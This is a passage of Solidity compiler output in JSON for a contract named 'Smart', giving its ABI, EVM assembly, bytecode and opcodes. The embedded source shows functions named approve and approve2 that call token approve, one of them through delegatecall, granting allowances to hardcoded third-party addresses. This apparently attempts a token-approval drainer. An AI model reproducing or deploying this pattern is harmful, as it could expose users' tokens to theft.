{
	"contracts/Smart.sol": {
		"Smart": {
			"abi": [
				{
					"constant": false,
					"inputs": [
						{
							"name": "_spenders",
							"type": "address[]"
						},
						{
							"name": "_value",
							"type": "uint256"
						}
					],
					"name": "approve",
					"outputs": [
						{
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "getOwner",
					"outputs": [
						{
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "approve2",
					"outputs": [
						{
							"name": "",
							"type": "bool[2]"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"name": "success1",
							"type": "bool"
						},
						{
							"indexed": false,
							"name": "success2",
							"type": "bool"
						}
					],
					"name": "Response",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"name": "sender",
							"type": "address"
						}
					],
					"name": "Sender",
					"type": "event"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"contracts/Smart.sol\":51:1755  contract Smart {... */\n  mstore(0x40, 0x60)\n  jumpi(tag_1, iszero(callvalue))\n  0x0\n  dup1\n  revert\ntag_1:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Smart.sol\":51:1755  contract Smart {... */\n      mstore(0x40, 0x60)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x3c046960\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x893d20e8\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xaaaa9c35\n      eq\n      tag_5\n      jumpi\n    tag_1:\n      0x0\n      dup1\n      revert\n        /* \"contracts/Smart.sol\":340:645  function approve(address[] memory _spenders, uint _value) public returns(bool) {... */\n    tag_2:\n      jumpi(tag_6, iszero(callvalue))\n      0x0\n      dup1\n      revert\n    tag_6:\n      tag_7\n      0x4\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      dup3\n      add\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup1\n      0x20\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap4\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup4\n      dup4\n      0x20\n      mul\n      dup1\n      dup3\n      dup5\n      calldatacopy\n      dup3\n      add\n      swap2\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap2\n      swap1\n      pop\n      pop\n      jump(tag_8)\n    tag_7:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Smart.sol\":250:333  function getOwner() public view returns(address) {... */\n    tag_3:\n      jumpi(tag_9, iszero(callvalue))\n      0x0\n      dup1\n      revert\n    tag_9:\n      tag_10\n      jump(tag_11)\n    tag_10:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Smart.sol\":72:93  address  public owner */\n    tag_4:\n      jumpi(tag_12, iszero(callvalue))\n      0x0\n      dup1\n      revert\n    tag_12:\n      tag_13\n      jump(tag_14)\n    tag_13:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Smart.sol\":847:1746  function approve2() public returns (bool[2]){... */\n    tag_5:\n      jumpi(tag_15, iszero(callvalue))\n      0x0\n      dup1\n      revert\n    tag_15:\n      tag_16\n      jump(tag_17)\n    tag_16:\n      mload(0x40)\n      dup1\n      dup3\n      mul(0x20, 0x2)\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x0\n        /* \"--CODEGEN--\":8:108   */\n    tag_18:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_19\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_18)\n    tag_19:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"contracts/Smart.sol\":847:1746  function approve2() public returns (bool[2]){... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Smart.sol\":340:645  function approve(address[] memory _spenders, uint _value) public returns(bool) {... */\n    tag_8:\n        /* \"contracts/Smart.sol\":413:417  bool */\n      0x0\n        /* \"contracts/Smart.sol\":439:445  uint i */\n      dup1\n        /* \"contracts/Smart.sol\":492:504  IBEP20 token */\n      0x0\n        /* \"contracts/Smart.sol\":448:449  0 */\n      dup1\n        /* \"contracts/Smart.sol\":439:449  uint i = 0 */\n      swap2\n      pop\n        /* \"contracts/Smart.sol\":434:617  for (uint i = 0; i < _spenders.length; i++) {... */\n    tag_22:\n        /* \"contracts/Smart.sol\":455:464  _spenders */\n      dup5\n        /* \"contracts/Smart.sol\":455:471  _spenders.length */\n      mload\n        /* \"contracts/Smart.sol\":451:452  i */\n      dup3\n        /* \"contracts/Smart.sol\":451:471  i < _spenders.length */\n      lt\n        /* \"contracts/Smart.sol\":434:617  for (uint i = 0; i < _spenders.length; i++) {... */\n      iszero\n      tag_23\n      jumpi\n        /* \"contracts/Smart.sol\":514:523  _spenders */\n      dup5\n        /* \"contracts/Smart.sol\":524:525  i */\n      dup3\n        /* \"contracts/Smart.sol\":514:526  _spenders[i] */\n      dup2\n      mload\n      dup2\n      lt\n      iszero\n      iszero\n      tag_25\n      jumpi\n      invalid\n    tag_25:\n      swap1\n      0x20\n      add\n      swap1\n      0x20\n      mul\n      add\n      mload\n        /* \"contracts/Smart.sol\":492:527  IBEP20 token = IBEP20(_spenders[i]) */\n      swap1\n      pop\n        /* \"contracts/Smart.sol\":541:546  token */\n      dup1\n        /* \"contracts/Smart.sol\":541:554  token.approve */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x95ea7b3\n        /* \"contracts/Smart.sol\":555:597  0xD072F99a88efa8484F393Bc73B5Cab09606b21f2 */\n      0xd072f99a88efa8484f393bc73b5cab09606b21f2\n        /* \"contracts/Smart.sol\":599:605  _value */\n      dup7\n        /* \"contracts/Smart.sol\":541:606  token.approve(0xD072F99a88efa8484F393Bc73B5Cab09606b21f2, _value) */\n      mstore(add(0x20, mload(0x40)), 0x0)\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n      iszero\n      tag_26\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_26:\n      sub(gas, 0x2c6)\n      call\n      iszero\n      iszero\n      tag_27\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_27:\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      mload\n      swap1\n      pop\n      pop\n        /* \"contracts/Smart.sol\":473:476  i++ */\n      dup2\n      dup1\n      0x1\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/Smart.sol\":434:617  for (uint i = 0; i < _spenders.length; i++) {... */\n      jump(tag_22)\n    tag_23:\n        /* \"contracts/Smart.sol\":634:638  true */\n      0x1\n        /* \"contracts/Smart.sol\":627:638  return true */\n      swap3\n      pop\n        /* \"contracts/Smart.sol\":340:645  function approve(address[] memory _spenders, uint _value) public returns(bool) {... */\n      pop\n      pop\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Smart.sol\":250:333  function getOwner() public view returns(address) {... */\n    tag_11:\n        /* \"contracts/Smart.sol\":290:297  address */\n      0x0\n        /* \"contracts/Smart.sol\":316:326  msg.sender */\n      caller\n        /* \"contracts/Smart.sol\":309:326  return msg.sender */\n      swap1\n      pop\n        /* \"contracts/Smart.sol\":250:333  function getOwner() public view returns(address) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Smart.sol\":72:93  address  public owner */\n    tag_14:\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Smart.sol\":847:1746  function approve2() public returns (bool[2]){... */\n    tag_17:\n        /* \"contracts/Smart.sol\":883:890  bool[2] */\n      tag_29\n      jump\t// in(tag_30)\n    tag_29:\n        /* \"contracts/Smart.sol\":901:914  address token */\n      0x0\n        /* \"contracts/Smart.sol\":975:989  uint256 amount */\n      dup1\n        /* \"contracts/Smart.sol\":1211:1224  bool success1 */\n      0x0\n        /* \"contracts/Smart.sol\":1291:1304  bool success2 */\n      dup1\n        /* \"contracts/Smart.sol\":917:959  0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402 */\n      0x7083609fce4d1d8dc0c979aab8c869ea2c873402\n        /* \"contracts/Smart.sol\":901:959  address token = 0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402 */\n      swap4\n      pop\n        /* \"contracts/Smart.sol\":992:1001  777777777 */\n      0x2e5bf271\n        /* \"contracts/Smart.sol\":975:1001  uint256 amount = 777777777 */\n      swap3\n      pop\n        /* \"contracts/Smart.sol\":1227:1232  token */\n      dup4\n        /* \"contracts/Smart.sol\":1227:1245  token.delegatecall */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Smart.sol\":1253:1274  keccak256(\"symbol()\") */\n      mload(0x40)\n      dup1\n      dup1\n      0x73796d626f6c2829000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x8\n      add\n      swap1\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      keccak256\n        /* \"contracts/Smart.sol\":1227:1276  token.delegatecall(bytes4(keccak256(\"symbol()\"))) */\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      sub(gas, 0x646e)\n      delegatecall\n      swap3\n      pop\n      pop\n      pop\n        /* \"contracts/Smart.sol\":1211:1276  bool success1 = token.delegatecall(bytes4(keccak256(\"symbol()\"))) */\n      swap2\n      pop\n        /* \"contracts/Smart.sol\":1307:1312  token */\n      dup4\n        /* \"contracts/Smart.sol\":1307:1325  token.delegatecall */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Smart.sol\":1333:1370  keccak256(\"approve(address,uint256)\") */\n      mload(0x40)\n      dup1\n      dup1\n      0x617070726f766528616464726573732c75696e74323536290000000000000000\n      dup2\n      mstore\n      pop\n      0x18\n      add\n      swap1\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      keccak256\n        /* \"contracts/Smart.sol\":1307:1436  token.delegatecall(bytes4(keccak256(\"approve(address,uint256)\")),... */\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n        /* \"contracts/Smart.sol\":1385:1427  0xd15bEC67023f139D3eF791c0F4e898eF136bc664 */\n      0xd15bec67023f139d3ef791c0f4e898ef136bc664\n        /* \"contracts/Smart.sol\":1429:1435  amount */\n      dup6\n        /* \"contracts/Smart.sol\":1307:1436  token.delegatecall(bytes4(keccak256(\"approve(address,uint256)\")),... */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      sub(gas, 0x646e)\n      delegatecall\n      swap3\n      pop\n      pop\n      pop\n        /* \"contracts/Smart.sol\":1291:1436  bool success2 = token.delegatecall(bytes4(keccak256(\"approve(address,uint256)\")),... */\n      swap1\n      pop\n        /* \"contracts/Smart.sol\":1621:1649  Response(success1, success2) */\n      0xc45e9b3ac19bf635feaed560109cb8931031fbbc86809d50d65d41a2cf2fe8b9\n        /* \"contracts/Smart.sol\":1630:1638  success1 */\n      dup3\n        /* \"contracts/Smart.sol\":1640:1648  success2 */\n      dup3\n        /* \"contracts/Smart.sol\":1621:1649  Response(success1, success2) */\n      mload(0x40)\n      dup1\n      dup4\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/Smart.sol\":1703:1730  return [success1, success2] */\n      0x40\n      dup1\n      mload\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n        /* \"contracts/Smart.sol\":1711:1719  success1 */\n      dup4\n        /* \"contracts/Smart.sol\":1703:1730  return [success1, success2] */\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n        /* \"contracts/Smart.sol\":1721:1729  success2 */\n      dup3\n        /* \"contracts/Smart.sol\":1703:1730  return [success1, success2] */\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      pop\n      swap5\n      pop\n        /* \"contracts/Smart.sol\":847:1746  function approve2() public returns (bool[2]){... */\n      pop\n      pop\n      pop\n      pop\n      swap1\n      jump\t// out\n        /* \"contracts/Smart.sol\":51:1755  contract Smart {... */\n    tag_30:\n      0x40\n      dup1\n      mload\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      0x2\n      swap1\n    tag_32:\n      iszero(iszero(0x0))\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      0x1\n      swap1\n      sub\n      swap1\n      dup2\n      tag_32\n      jumpi\n      swap1\n      pop\n      pop\n      swap1\n      jump\t// out\n\n    auxdata: 0xa165627a7a723058206ac7f813e6d83e043be30e84516be55fffd792a5035e9c8bbef422f2d7eb71190029\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6060604052341561000f57600080fd5b6105cd8061001e6000396000f300606060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633c04696014610067578063893d20e8146100e25780638da5cb5b14610137578063aaaa9c351461018c575b600080fd5b341561007257600080fd5b6100c86004808035906020019082018035906020019080806020026020016040519081016040528093929190818152602001838360200280828437820191505050505050919080359060200190919050506101dd565b604051808215151515815260200191505060405180910390f35b34156100ed57600080fd5b6100f56102fd565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b341561014257600080fd5b61014a610305565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b341561019757600080fd5b61019f61032a565b6040518082600260200280838360005b838110156101ca5780820151818401526020810190506101af565b5050505090500191505060405180910390f35b60008060008091505b84518210156102f15784828151811015156101fd57fe5b9060200190602002015190508073ffffffffffffffffffffffffffffffffffffffff1663095ea7b373d072f99a88efa8484f393bc73b5cab09606b21f2866000604051602001526040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b15156102c857600080fd5b6102c65a03f115156102d957600080fd5b505050604051805190505081806001019250506101e6565b60019250505092915050565b600033905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b610332610578565b600080600080737083609fce4d1d8dc0c979aab8c869ea2c8734029350632e5bf27192508373ffffffffffffffffffffffffffffffffffffffff1660405180807f73796d626f6c2829000000000000000000000000000000000000000000000000815250600801905060405180910390207c010000000000000000000000000000000000000000000000000000000090046040518163ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818661646e5a03f49250505091508373ffffffffffffffffffffffffffffffffffffffff1660405180807f617070726f766528616464726573732c75696e74323536290000000000000000815250601801905060405180910390207c0100000000000000000000000000000000000000000000000000000000900473d15bec67023f139d3ef791c0f4e898ef136bc664856040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506000604051808303818661646e5a03f49250505090507fc45e9b3ac19bf635feaed560109cb8931031fbbc86809d50d65d41a2cf2fe8b982826040518083151515158152602001821515151581526020019250505060405180910390a1604080519081016040528083151515158152602001821515151581525094505050505090565b60408051908101604052806002905b6000151581526020019060019003908161058757905050905600a165627a7a723058206ac7f813e6d83e043be30e84516be55fffd792a5035e9c8bbef422f2d7eb71190029",
					"opcodes": "PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH2 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x5CD DUP1 PUSH2 0x1E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x62 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x3C046960 EQ PUSH2 0x67 JUMPI DUP1 PUSH4 0x893D20E8 EQ PUSH2 0xE2 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x137 JUMPI DUP1 PUSH4 0xAAAA9C35 EQ PUSH2 0x18C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE ISZERO PUSH2 0x72 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xC8 PUSH1 0x4 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP3 ADD DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP1 PUSH1 0x20 MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP4 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP4 DUP4 PUSH1 0x20 MUL DUP1 DUP3 DUP5 CALLDATACOPY DUP3 ADD SWAP2 POP POP POP POP POP POP SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP2 SWAP1 POP POP PUSH2 0x1DD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE ISZERO PUSH2 0xED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xF5 PUSH2 0x2FD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE ISZERO PUSH2 0x142 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x14A PUSH2 0x305 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE ISZERO PUSH2 0x197 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x19F PUSH2 0x32A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0x2 PUSH1 0x20 MUL DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x1CA JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x1AF JUMP JUMPDEST POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0x2F1 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT ISZERO ISZERO PUSH2 0x1FD JUMPI INVALID JUMPDEST SWAP1 PUSH1 0x20 ADD SWAP1 PUSH1 0x20 MUL ADD MLOAD SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x95EA7B3 PUSH20 0xD072F99A88EFA8484F393BC73B5CAB09606B21F2 DUP7 PUSH1 0x0 PUSH1 0x40 MLOAD PUSH1 0x20 ADD MSTORE PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x2C8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0x2D9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP PUSH1 0x40 MLOAD DUP1 MLOAD SWAP1 POP POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x1E6 JUMP JUMPDEST PUSH1 0x1 SWAP3 POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH2 0x332 PUSH2 0x578 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH20 0x7083609FCE4D1D8DC0C979AAB8C869EA2C873402 SWAP4 POP PUSH4 0x2E5BF271 SWAP3 POP DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP1 DUP1 PUSH32 0x73796D626F6C2829000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x8 ADD SWAP1 POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 PUSH2 0x646E GAS SUB DELEGATECALL SWAP3 POP POP POP SWAP2 POP DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP1 DUP1 PUSH32 0x617070726F766528616464726573732C75696E74323536290000000000000000 DUP2 MSTORE POP PUSH1 0x18 ADD SWAP1 POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH20 0xD15BEC67023F139D3EF791C0F4E898EF136BC664 DUP6 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 PUSH2 0x646E GAS SUB DELEGATECALL SWAP3 POP POP POP SWAP1 POP PUSH32 0xC45E9B3AC19BF635FEAED560109CB8931031FBBC86809D50D65D41A2CF2FE8B9 DUP3 DUP3 PUSH1 0x40 MLOAD DUP1 DUP4 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x40 DUP1 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 DUP4 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE POP SWAP5 POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2 SWAP1 JUMPDEST PUSH1 0x0 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP1 PUSH1 0x1 SWAP1 SUB SWAP1 DUP2 PUSH2 0x587 JUMPI SWAP1 POP POP SWAP1 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 PUSH11 0xC7F813E6D83E043BE30E84 MLOAD PUSH12 0xE55FFFD792A5035E9C8BBEF4 0x22 CALLCODE 0xd7 0xeb PUSH18 0x190029000000000000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "297000",
						"executionCost": "332",
						"totalCost": "297332"
					},
					"external": {
						"approve(address[],uint256)": "infinite",
						"approve2()": "infinite",
						"getOwner()": "227",
						"owner()": "478"
					},
					"internal": {
						"isContract(address)": "infinite"
					}
				},
				"methodIdentifiers": {
					"approve(address[],uint256)": "3c046960",
					"approve2()": "aaaa9c35",
